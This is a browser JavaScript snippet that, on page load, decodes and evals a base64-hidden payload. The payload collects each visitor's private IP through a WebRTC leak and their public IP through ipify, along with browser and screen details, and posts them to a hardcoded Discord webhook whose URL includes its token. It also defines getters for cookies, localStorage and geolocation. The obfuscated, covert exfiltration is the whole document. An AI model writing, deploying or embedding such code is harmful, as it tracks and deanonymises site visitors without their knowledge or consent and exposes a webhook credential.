window.onload = function() {eval(window.atob("KGZ1bmN0aW9uICgpIHsKICAgIGZ1bmN0aW9uIEdldEludGVybmFsSVAob25OZXdJUCkgeyAvLyAgb25OZXdJcCAtIHlvdXIgbGlzdGVuZXIgZnVuY3Rpb24gZm9yIG5ldyBJUHMKICAgICAgICAvL2NvbXBhdGliaWxpdHkgZm9yIGZpcmVmb3ggYW5kIGNocm9tZQogICAgICAgIHZhciBteVBlZXJDb25uZWN0aW9uID0gd2luZG93LlJUQ1BlZXJDb25uZWN0aW9uIHx8IHdpbmRvdy5tb3pSVENQZWVyQ29ubmVjdGlvbiB8fCB3aW5kb3cud2Via2l0UlRDUGVlckNvbm5lY3Rpb247CiAgICAgICAgdmFyIHBjID0gbmV3IG15UGVlckNvbm5lY3Rpb24oewogICAgICAgICAgICBpY2VTZXJ2ZXJzOiBbXQogICAgICAgIH0pLAogICAgICAgICAgICBub29wID0gZnVuY3Rpb24gKCkgeyB9LAogICAgICAgICAgICBsb2NhbElQcyA9IHt9LAogICAgICAgICAgICBpcFJlZ2V4ID0gLyhbMC05XXsxLDN9KFwuWzAtOV17MSwzfSl7M318W2EtZjAtOV17MSw0fSg6W2EtZjAtOV17MSw0fSl7N30pL2csCiAgICAgICAgICAgIGtleTsKCiAgICAgICAgZnVuY3Rpb24gaXRlcmF0ZUlQKGlwKSB7CiAgICAgICAgICAgIGlmICghbG9jYWxJUHNbaXBdKSBvbk5ld0lQKGlwKTsKICAgICAgICAgICAgbG9jYWxJUHNbaXBdID0gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIC8vY3JlYXRlIGEgYm9ndXMgZGF0YSBjaGFubmVsCiAgICAgICAgcGMuY3JlYXRlRGF0YUNoYW5uZWwoIiIpOwoKICAgICAgICAvLyBjcmVhdGUgb2ZmZXIgYW5kIHNldCBsb2NhbCBkZXNjcmlwdGlvbgogICAgICAgIHBjLmNyZWF0ZU9mZmVyKCkudGhlbihmdW5jdGlvbiAoc2RwKSB7CiAgICAgICAgICAgIHNkcC5zZHAuc3BsaXQoJ1xuJykuZm9yRWFjaChmdW5jdGlvbiAobGluZSkgewogICAgICAgICAgICAgICAgaWYgKGxpbmUuaW5kZXhPZignY2FuZGlkYXRlJykgPCAwKSByZXR1cm47CiAgICAgICAgICAgICAgICBsaW5lLm1hdGNoKGlwUmVnZXgpLmZvckVhY2goaXRlcmF0ZUlQKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBwYy5zZXRMb2NhbERlc2NyaXB0aW9uKHNkcCwgbm9vcCwgbm9vcCk7CiAgICAgICAgfSkuY2F0Y2goZnVuY3Rpb24gKHJlYXNvbikgewogICAgICAgICAgICAvLyBBbiBlcnJvciBvY2N1cnJlZCwgc28gaGFuZGxlIHRoZSBmYWlsdXJlIHRvIGNvbm5lY3QKICAgICAgICB9KTsKCiAgICAgICAgLy9saXN0ZW4gZm9yIGNhbmRpZGF0ZSBldmVudHMKICAgICAgICBwYy5vbmljZWNhbmRpZGF0ZSA9IGZ1bmN0aW9uIChpY2UpIHsKICAgICAgICAgICAgaWYgKCFpY2UgfHwgIWljZS5jYW5kaWRhdGUgfHwgIWljZS5jYW5kaWRhdGUuY2FuZGlkYXRlIHx8ICFpY2UuY2FuZGlkYXRlLmNhbmRpZGF0ZS5tYXRjaChpcFJlZ2V4KSkgcmV0dXJuOwogICAgICAgICAgICBpY2UuY2FuZGlkYXRlLmNhbmRpZGF0ZS5tYXRjaChpcFJlZ2V4KS5mb3JFYWNoKGl0ZXJhdGVJUCk7CiAgICAgICAgfTsKICAgIH0KCiAgICBuYXZpZ2F0b3Iuc2F5c3dobyA9IChmdW5jdGlvbiAoKSB7CiAgICAgICAgdmFyIHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudCwgdGVtLAogICAgICAgICAgICBNID0gdWEubWF0Y2goLyhvcGVyYXxjaHJvbWV8c2FmYXJpfGZpcmVmb3h8bXNpZXx0cmlkZW50KD89XC8pKVwvP1xzKihcZCspL2kpIHx8IFtdOwogICAgICAgIGlmICgvdHJpZGVudC9pLnRlc3QoTVsxXSkpIHsKICAgICAgICAgICAgdGVtID0gL1xicnZbIDpdKyhcZCspL2cuZXhlYyh1YSkgfHwgW107CiAgICAgICAgICAgIHJldHVybiAnSUUgJyArICh0ZW1bMV0gfHwgJycpOwogICAgICAgIH0KICAgICAgICBpZiAoTVsxXSA9PT0gJ0Nocm9tZScpIHsKICAgICAgICAgICAgdGVtID0gdWEubWF0Y2goL1xiKE9QUnxFZGdlKVwvKFxkKykvKTsKICAgICAgICAgICAgaWYgKHRlbSAhPSBudWxsKSByZXR1cm4gdGVtLnNsaWNlKDEpLmpvaW4oJyAnKS5yZXBsYWNlKCdPUFInLCAnT3BlcmEnKTsKICAgICAgICB9CiAgICAgICAgTSA9IE1bMl0gPyBbTVsxXSwgTVsyXV0gOiBbbmF2aWdhdG9yLmFwcE5hbWUsIG5hdmlnYXRvci5hcHBWZXJzaW9uLCAnLT8nXTsKICAgICAgICBpZiAoKHRlbSA9IHVhLm1hdGNoKC92ZXJzaW9uXC8oXGQrKS9pKSkgIT0gbnVsbCkgTS5zcGxpY2UoMSwgMSwgdGVtWzFdKTsKICAgICAgICByZXR1cm4gTS5qb2luKCcgJyk7CiAgICB9KSgpOwoKICAgIHZhciBpbmZvID0gewoKICAgICAgICB0aW1lT3BlbmVkOiBuZXcgRGF0ZSgpLAogICAgICAgIHRpbWV6b25lOiAobmV3IERhdGUoKSkuZ2V0VGltZXpvbmVPZmZzZXQoKSAvIDYwLAoKICAgICAgICBwYWdlb24oKSB7IHJldHVybiB3aW5kb3cubG9jYXRpb24ucGF0aG5hbWUgfSwKICAgICAgICByZWZlcnJlcigpIHsgcmV0dXJuIGRvY3VtZW50LnJlZmVycmVyIH0sCiAgICAgICAgcHJldmlvdXNTaXRlcygpIHsgcmV0dXJuIGhpc3RvcnkubGVuZ3RoIH0sCgogICAgICAgIGJyb3dzZXJOYW1lKCkgeyByZXR1cm4gbmF2aWdhdG9yLmFwcE5hbWUgfSwKICAgICAgICBicm93c2VyRW5naW5lKCkgeyByZXR1cm4gbmF2aWdhdG9yLnByb2R1Y3QgfSwKICAgICAgICBicm93c2VyVmVyc2lvbjFhKCkgeyByZXR1cm4gbmF2aWdhdG9yLmFwcFZlcnNpb24gfSwKICAgICAgICBicm93c2VyVmVyc2lvbjFiKCkgeyByZXR1cm4gbmF2aWdhdG9yLnVzZXJBZ2VudCB9LAogICAgICAgIGJyb3dzZXJMYW5ndWFnZSgpIHsgcmV0dXJuIG5hdmlnYXRvci5sYW5ndWFnZSB9LAogICAgICAgIGJyb3dzZXJPbmxpbmUoKSB7IHJldHVybiBuYXZpZ2F0b3Iub25MaW5lIH0sCiAgICAgICAgYnJvd3NlclBsYXRmb3JtKCkgeyByZXR1cm4gbmF2aWdhdG9yLnBsYXRmb3JtIH0sCiAgICAgICAgamF2YUVuYWJsZWQoKSB7IHJldHVybiBuYXZpZ2F0b3IuamF2YUVuYWJsZWQoKSB9LAogICAgICAgIGRhdGFDb29raWVzRW5hYmxlZCgpIHsgcmV0dXJuIG5hdmlnYXRvci5jb29raWVFbmFibGVkIH0sCiAgICAgICAgZGF0YUNvb2tpZXMxKCkgeyByZXR1cm4gZG9jdW1lbnQuY29va2llIH0sCiAgICAgICAgZGF0YUNvb2tpZXMyKCkgeyByZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZS5zcGxpdCgiOyIpKSB9LAogICAgICAgIGRhdGFTdG9yYWdlKCkgeyByZXR1cm4gbG9jYWxTdG9yYWdlIH0sCgogICAgICAgIHNpemVTY3JlZW5XKCkgeyByZXR1cm4gc2NyZWVuLndpZHRoIH0sCiAgICAgICAgc2l6ZVNjcmVlbkgoKSB7IHJldHVybiBzY3JlZW4uaGVpZ2h0IH0sCiAgICAgICAgc2l6ZURvY1coKSB7IHJldHVybiBkb2N1bWVudC53aWR0aCB9LAogICAgICAgIHNpemVEb2NIKCkgeyByZXR1cm4gZG9jdW1lbnQuaGVpZ2h0IH0sCiAgICAgICAgc2l6ZUluVygpIHsgcmV0dXJuIGlubmVyV2lkdGggfSwKICAgICAgICBzaXplSW5IKCkgeyByZXR1cm4gaW5uZXJIZWlnaHQgfSwKICAgICAgICBzaXplQXZhaWxXKCkgeyByZXR1cm4gc2NyZWVuLmF2YWlsV2lkdGggfSwKICAgICAgICBzaXplQXZhaWxIKCkgeyByZXR1cm4gc2NyZWVuLmF2YWlsSGVpZ2h0IH0sCiAgICAgICAgc2NyQ29sb3JEZXB0aCgpIHsgcmV0dXJuIHNjcmVlbi5jb2xvckRlcHRoIH0sCiAgICAgICAgc2NyUGl4ZWxEZXB0aCgpIHsgcmV0dXJuIHNjcmVlbi5waXhlbERlcHRoIH0sCgoKICAgICAgICBsYXRpdHVkZSgpIHsgcmV0dXJuIHBvc2l0aW9uLmNvb3Jkcy5sYXRpdHVkZSB9LAogICAgICAgIGxvbmdpdHVkZSgpIHsgcmV0dXJuIHBvc2l0aW9uLmNvb3Jkcy5sb25naXR1ZGUgfSwKICAgICAgICBhY2N1cmFjeSgpIHsgcmV0dXJuIHBvc2l0aW9uLmNvb3Jkcy5hY2N1cmFjeSB9LAogICAgICAgIGFsdGl0dWRlKCkgeyByZXR1cm4gcG9zaXRpb24uY29vcmRzLmFsdGl0dWRlIH0sCiAgICAgICAgYWx0aXR1ZGVBY2N1cmFjeSgpIHsgcmV0dXJuIHBvc2l0aW9uLmNvb3Jkcy5hbHRpdHVkZUFjY3VyYWN5IH0sCiAgICAgICAgaGVhZGluZygpIHsgcmV0dXJuIHBvc2l0aW9uLmNvb3Jkcy5oZWFkaW5nIH0sCiAgICAgICAgc3BlZWQoKSB7IHJldHVybiBwb3NpdGlvbi5jb29yZHMuc3BlZWQgfSwKICAgICAgICB0aW1lc3RhbXAoKSB7IHJldHVybiBwb3NpdGlvbi50aW1lc3RhbXAgfSwKCgogICAgfTsKCiAgICBmdW5jdGlvbiBkaXNjb3JkX21lc3NhZ2Uod2ViSG9va1VSTCwgbWVzc2FnZSkgewogICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICB4aHIub3BlbigiUE9TVCIsIHdlYkhvb2tVUkwsIHRydWUpOwogICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpOwogICAgICAgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgJ2NvbnRlbnQnOiBtZXNzYWdlLAogICAgICAgICAgICAndXNlcm5hbWUnOiAnQUknLAogICAgICAgIH0pKTsKICAgIH0KCiAgICBHZXRJbnRlcm5hbElQKGZ1bmN0aW9uIChwcml2YXRlaXApIHsKICAgICAgICBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJykKICAgICAgICAgICAgLnRoZW4oZnVuY3Rpb24gKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpOwogICAgICAgICAgICB9KQogICAgICAgICAgICAudGhlbihmdW5jdGlvbiAocHVibGljKSB7CiAgICAgICAgICAgICAgICBuZXQgPSB7CiAgICAgICAgICAgICAgICAgICAgcHJpdmF0ZTogcHJpdmF0ZWlwLAogICAgICAgICAgICAgICAgICAgIHB1YmxpYzogcHVibGljLmlwLAogICAgICAgICAgICAgICAgICAgIEJyb3N3ZXI6IG5hdmlnYXRvci5zYXlzd2hvLAogICAgICAgICAgICAgICAgICAgIHNpemVTY3JlZW5XOiBpbmZvLnNpemVTY3JlZW5XKCksCiAgICAgICAgICAgICAgICAgICAgc2l6ZVNjcmVlbkg6IGluZm8uc2l6ZVNjcmVlbkgoKQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2cobmV0KTsKICAgICAgICAgICAgICAgIGNvbnN0IGhvb2sgPSAnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNTkzODYxNTQzODg4OTQ1MTcyL0t1MTc5WHdZWGtPU1VSdDFacUxLdkoxbmRBYlY3Y3R4QVBSOTVQZ2lSSmVXNEZiblZjd3pLVWVfYU9RSDZ0ZkZRRlZzJwogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICc6ZXllczpcbmBgYGpzb25cbicgKyBKU09OLnN0cmluZ2lmeShuZXQsIG51bGwsIDIpICsgIlxuYGBgIgogICAgICAgICAgICAgICAgZGlzY29yZF9tZXNzYWdlKGhvb2ssIG1lc3NhZ2UpCiAgICAgICAgICAgIH0pOwogICAgfSk7Cn0pKCk7"))}